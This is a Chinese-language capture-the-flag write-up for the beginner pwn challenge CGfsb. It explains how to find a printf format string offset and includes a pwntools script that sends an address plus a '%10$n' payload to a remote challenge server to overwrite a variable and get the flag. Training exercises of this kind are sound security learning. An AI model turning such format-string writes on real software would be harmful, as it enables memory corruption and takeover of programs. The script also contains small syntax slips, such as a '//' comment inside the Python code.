## 攻防世界 新手 PWN----[CGfsb](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5050&page=1)

题目中暗示使用`printf `的`format string`漏洞。漏洞详解可参照[链接](https://wiki.x10sec.org/pwn/fmtstr/fmtstr_intro/)

首先用checksec命令检查可执行文件。

```shell
	Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

发现栈不可执行，且有金丝雀保护。但是没有开始地址随机化。

本地执行程序测试，执行报错`No such file or directory`，通过搜索查到，因为此程序是32位程序，在64位机器上缺少动态运行库，通过命令`sudo apt install libc6-i386`可解决。

main函数猜测源码如下

![CGfsb](C:\Users\liu\Desktop\Notes\images\CGfsb.png)

因为没有开启地址随机，由汇编可得pwnme变量地址0X804a068。

![CGfsb2](C:\Users\liu\Desktop\Notes\images\CGfsb2.png)

通过上述分析可知，只要使得pwnme的值为8即可获得flag。

通过在message的地方输入`AAAA.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x\n`，得printf第一个参数（即格式化字符串地址）存放地址与格式化字符串相隔10个距离。

![cgfsb3](C:\Users\liu\Desktop\Notes\images\cgfsb3.png)

可使用格式化字符串漏洞改写该变量。

```python
from pwn import *

context.log_level = "DEBUG"
addr = p32(0x804a068)

# p = process("./hello")
p = remote("111.198.29.45", 32277)
p.recvuntil("please tell me your name:\n")
p.send("liu")
p.recvuntil("leave your message please:\n")
p.send(addr + bytes("aaaa%10$n"))    // addr占4个byte，字符串aaaa占4个byte

p.interactive()
```





